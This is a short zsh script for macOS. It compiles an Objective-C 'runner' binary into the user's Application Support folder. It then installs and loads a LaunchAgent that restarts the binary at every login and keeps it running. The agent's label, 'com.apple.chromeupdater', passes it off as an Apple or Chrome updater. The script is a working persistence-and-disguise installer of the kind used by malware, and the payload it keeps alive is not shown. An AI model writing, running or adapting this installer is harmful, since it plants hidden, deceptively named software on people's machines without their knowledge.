#!/bin/zsh

RUNNER_SRC="working_runner.m"
RUNNER_BIN="$HOME/Library/Application Support/working_runner"
PLIST_PATH="$HOME/Library/LaunchAgents/com.apple.chromeupdater.plist"

echo "[*] Compiling runner..."
clang -target arm64-apple-darwin -framework Foundation -fobjc-arc -o "$RUNNER_BIN" "$RUNNER_SRC"

if [[ $? -ne 0 ]]; then
    echo "[!] Compilation failed."
    exit 1
fi

echo "[*] Creating plist at $PLIST_PATH..."

mkdir -p "$(dirname "$PLIST_PATH")"

cat <<EOF > "$PLIST_PATH"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.chromeupdater</string>

    <key>ProgramArguments</key>
    <array>
        <string>$RUNNER_BIN</string>
    </array>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

echo "[*] Loading LaunchAgent..."
launchctl load "$PLIST_PATH"

if [[ $? -eq 0 ]]; then
    echo "[+] LaunchAgent loaded successfully."
else
    echo "[!] Failed to load LaunchAgent."
fi
